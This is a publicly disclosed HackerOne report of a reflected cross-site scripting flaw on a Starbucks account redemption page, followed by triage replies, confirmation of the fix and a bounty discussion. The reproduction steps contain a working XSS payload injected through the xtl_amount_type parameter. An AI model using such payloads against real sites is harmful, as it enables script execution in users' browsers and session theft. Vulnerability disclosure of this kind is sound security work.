title: Reflected XSS in https://www.starbucks.com/account/create/redeem/MCP131XSR via xtl_amount, xtl_coupon_code, xtl_amount_type parameters

profile.name: Starbucks
profile.about: Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time.

vulnerability_information:
HI,

**Summary:** Reflected XSS 
**Description:**  the parameters are complementary to each other
**Platform(s) Affected:**  my browser firefox 52.7.3

## Steps To Reproduce:

   1. go to https://www.starbucks.com/account/create/redeem/MCP131XSR?xtl_coupon_code=1&xtl_coupon_code=81431&xtl_amount=0.0&xtl_amount_type=DOLLAR_VALUE
   1. change parameter `xtl_amount_type` to </script><svg/onload=alert()>` >note:if you  go enter this the payload not work but!!!!! you change `xtl_coupon_code` and `xtl_amount` payload will work
   1. change `xtl_coupon_code` and `xtl_amount` to any think 

   1.payload be like https://www.starbucks.com/account/create/redeem/MCP131XSR?xtl_coupon_code=1&xtl_coupon_code=hkjhkjh&xtl_amount=jhkjhj&xtl_amount_type=ayn%3C/script%3E%3Csvg/onload=alert(document%2edomain)%3E
  
## Supporting Material/References:

 {F464214}


## How can the system be exploited with this bug?
  
The attacker can execute JS code.

## How did you come across this bug ?
change `xtl_coupon_code` and `xtl_amount` payload will work
In this bug the parameters are complementary to each other

## Recommendations for fix

In this bug the parameters are complementary to each other try to retreat

## Impact

* The attacker can execute JS code.
vulnerability_information_html:
HI,

Summary: Reflected XSS
Description: the parameters are complementary to each other
Platform(s) Affected: my browser firefox 52.7.3

Steps To Reproduce:

  1. go to https://www.starbucks.com/account/create/redeem/MCP131XSR?xtl_coupon_code=1&xtl_coupon_code=81431&xtl_amount=0.0&xtl_amount_type=DOLLAR_VALUE
  2. change parameter xtl_amount_type to </script><svg/onload=alert()>>note:if you go enter this the payload not work but!!!!! you changextl_coupon_codeandxtl_amount` payload will work
  3. change xtl_coupon_code and xtl_amount to any think

1.payload be like https://www.starbucks.com/account/create/redeem/MCP131XSR?xtl_coupon_code=1&xtl_coupon_code=hkjhkjh&xtl_amount=jhkjhj&xtl_amount_type=ayn%3C/script%3E%3Csvg/onload=alert(document%2edomain)%3E

Supporting Material/References:

How can the system be exploited with this bug?

The attacker can execute JS code.

How did you come across this bug ?

change xtl_coupon_code and xtl_amount payload will work
In this bug the parameters are complementary to each other

Recommendations for fix

In this bug the parameters are complementary to each other try to retreat

Impact

  • The attacker can execute JS code.

Hello @zayn1337,

I was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.

Sincerely,
@egghunter

activities.message:
Hi @zayn1337,

We received notification that this has been resolved. I just confirmed that none of the payloads you have submitted are successful in executing scripts maliciously. If you observe otherwise, please let us know and we'll take another look.

Thanks!
@shadegrown

activities.message:
Hello @zayn1337,

According to the program policy (https://hackerone.com/starbucks), $250 is the standard bounty for a Medium severity vulnerability, which is how this report scored in CVSS. Do you have reason to believe this is incorrect?

Thanks,
@itoen
activities.markdown_message:
Hello @zayn1337,

According to the program policy (https://hackerone.com/starbucks), $250 is the standard bounty for a Medium severity vulnerability, which is how this report scored in CVSS. Do you have reason to believe this is incorrect?

Thanks,
@itoen

activities.message:
Hi @itoen 
Yes, I have a feeling that something is wrong
See this report https://hackerone.com/reports/438240 
In this report, the bounty is 375$, which is Medium risky 4.8 and me 6.4

activities.message:
@zayn1337, for complete transparency, we are going to disclose this report in full, which includes the difficulty you had in receiving a timely response to your report. A breakdown of process between HackerOne and Starbucks resulted in this report being missed in Starbucks’ usual day-to-day activities. To help prevent this type of oversight from occurring again, we have worked with the HackerOne triage team to better clarify internal responsibilities and triage processes.
 
Regarding report: https://hackerone.com/reports/438240 and the higher payout. The cvss score for a medium is not necessarily the deciding factor for payment. 

Per our program rules (https://hackerone.com/starbucks - See Bounty Eligibility): 
We ask that you take the time to replicate the issue in other sites, and if replicating, please include all occurrences in one report instead of submitting them as multiple reports. We treat the issue as one bug and will close out others as duplicates. *Rest assured, we do take the existence of the vulnerability present on multiple sites into consideration during reward time.* 

For that report, the hacker demonstrated the same vulnerability within their report for multiple sites and thus was awarded the higher payout. Once again, thank you for your patience and your valued contributions to our Starbucks program here on HackerOne.

activities.message:
Echoing Starbucks, thank you so much for your contributions to this program and other programs on HackerOne @zayn1337. Your persistence helped spotlight an oversight, which we've rectified for future reports. If you have any further questions about bounty structure, feel free to reach out. Thanks again for your patience; my team and I hope to see more of you soon!

Please reach out if you have any questions. 

-- Bo Liu, Director of Technical Services at HackerOne

summaries.content:
zayn1337 discovered that the endpoint at https://www.starbucks.com/account/create/redeem/MCP131XSR was vulnerable to a reflected cross-site scripting vulnerability.

@zayn1337 — thank you for uncovering this vulnerability, your patience while we followed up on the issue and for confirming the resolution.
summaries.content_html:
zayn1337 discovered that the endpoint at https://www.starbucks.com/account/create/redeem/MCP131XSR was vulnerable to a reflected cross-site scripting vulnerability.

@zayn1337 — thank you for uncovering this vulnerability, your patience while we followed up on the issue and for confirming the resolution.
